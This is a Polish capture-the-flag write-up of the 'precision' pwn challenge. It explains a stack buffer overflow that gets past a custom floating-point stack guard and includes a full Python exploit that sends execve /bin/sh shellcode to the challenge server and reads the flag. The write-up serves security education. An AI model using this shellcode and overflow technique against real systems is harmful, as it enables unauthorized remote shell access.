## precision (pwn, 100p, 272 solves)

> nc 54.173.98.115 1259  
> [precision_a8f6f0590c177948fe06c76a1831e650](precision)

Pobieramy udostępnioną binarkę i na początek sprawdzamy jakie utrudnienia przygotowali nam autorzy.

```
# checksec.sh --file precision
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   precision
```
Widać, że nieduże ;).

Krótka analiza w IDA pokazuje nam, że program:
1. Realizuje własną wariację stack guard (dla małego utrudnienia jako liczbę zmiennoprzecinkową).
2. Wypisuje adres bufora oraz za pomocą `scanf` pobiera do niego od nas dane (za pomocą specyfikatora `%s` nieograniczającego wielkość).
3. Sprawdza wartość cookie/canary, wypisuje nasz bufor i wychodzi za pomocą zwykłego `ret`.

Mamy więc do czynienia z prostym buffer overflow z umieszczeniem shellcode'u na stosie (brak NX oraz podany adres bufora).

```python
import socket

s = socket.socket()
s.connect(('54.173.98.115', 1259))

buf_addr = s.recv(17)[8:16]

s.send('31c0b03001c430c050682f2f7368682f62696e89e389c1b0b0c0e804cd80c0e803cd80'.decode('hex').ljust(128, 'a')) # shellcode: execve /bin/sh
s.send('a5315a4755155040'.decode('hex')) # stack guard
s.send('aaaaaaaaaaaa') # padding
s.send(buf_addr.decode('hex')[::-1]) # ret: buffer address
s.send('\n')
print (s.recv(9999))
s.send('cat flag\n')
print (s.recv(9999))
s.close()
```

Oraz wynik:

`flag{1_533_y0u_kn0w_y0ur_w4y_4r0und_4_buff3r}`